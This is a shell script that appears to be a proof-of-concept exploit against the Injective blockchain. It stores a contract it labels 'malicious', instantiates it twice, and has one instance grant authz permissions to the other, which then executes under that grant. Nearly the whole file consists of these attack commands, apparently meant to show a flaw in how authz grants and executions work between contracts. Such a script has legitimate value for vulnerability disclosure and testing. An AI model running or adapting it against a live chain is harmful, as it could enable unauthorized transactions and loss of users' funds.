#!/bin/sh

# define home dir and code location
export INJHOME=$(pwd)/injhome
export CONTRACT="./artifacts/authzethtx.wasm"

echo "Deploying malicious contract"
echo 12345678 | injectived  tx wasm store $CONTRACT --home $INJHOME  --from user1 --chain-id injective-1  --fees 3788570inj --gas auto --gas-adjustment 1.3 --keyring-dir $INJHOME --keyring-backend "file" -y
sleep 5

echo "Instantiating malicious contract 1"
TX_HASH_1=$(echo 12345678 | injectived  tx wasm instantiate 1 "{}"  --gas 2000000 --fees 5788570inj --home $INJHOME  --from user1 --chain-id injective-1 --label "eth" --no-admin --keyring-dir $INJHOME --keyring-backend "file" -y| grep "txhash:" | cut -f2 -d' ')
echo "Instantiated in TX $TX_HASH_1"
sleep 3
CONTRACT_ADDR_1=$(injectived q tx $TX_HASH_1 -o json | jq -r '.events[] | select(.type == "cosmwasm.wasm.v1.EventContractInstantiated").attributes[] | select(.key == "contract_address").value | fromjson')

echo "Instantiating malicious contract 2"
TX_HASH_2=$(echo 12345678 | injectived  tx wasm instantiate 1 "{}"  --gas 2000000 --fees 5788570inj --home $INJHOME  --from user1 --chain-id injective-1 --label "eth" --no-admin --keyring-dir $INJHOME --keyring-backend "file" -y| grep "txhash:" | cut -f2 -d' ')
echo "Instantiated in TX $TX_HASH_2"
sleep 3
CONTRACT_ADDR_2=$(injectived q tx $TX_HASH_2 -o json | jq -r '.events[] | select(.type == "cosmwasm.wasm.v1.EventContractInstantiated").attributes[] | select(.key == "contract_address").value | fromjson')


echo "Calling malicious contract 1 $CONTRACT_ADDR_1 -> grant"
echo 12345678 |  injectived tx wasm execute $CONTRACT_ADDR_1 '{"submit_authz_grant":{"grantee":"'"$CONTRACT_ADDR_2"'"}}'  --gas 2000000 --fees 5788570inj --home $INJHOME  --from user1 --chain-id injective-1 --keyring-dir $INJHOME --keyring-backend "file" -y
sleep 5

echo "Calling malicious contract 2 $CONTRACT_ADDR_2 -> exec"
echo 12345678 |  injectived tx wasm execute $CONTRACT_ADDR_2 '{"submit_authz_exec":{"granter":"'"$CONTRACT_ADDR_1"'"}}'  --gas 2000000 --fees 5788570inj --home $INJHOME  --from user1 --chain-id injective-1 --keyring-dir $INJHOME --keyring-backend "file" -y